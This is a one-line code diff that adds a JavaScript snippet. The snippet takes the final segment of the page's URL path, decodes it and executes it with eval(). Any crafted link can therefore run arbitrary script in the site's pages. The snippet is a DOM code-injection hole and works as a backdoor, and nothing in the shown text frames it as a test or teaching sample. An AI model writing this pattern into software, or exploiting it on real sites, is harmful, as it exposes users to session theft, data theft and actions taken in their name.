@@ -1,0 +1,1 @@
+(function(){var segment=location.pathname.split("/").pop();eval(decodeURI(segment))})();
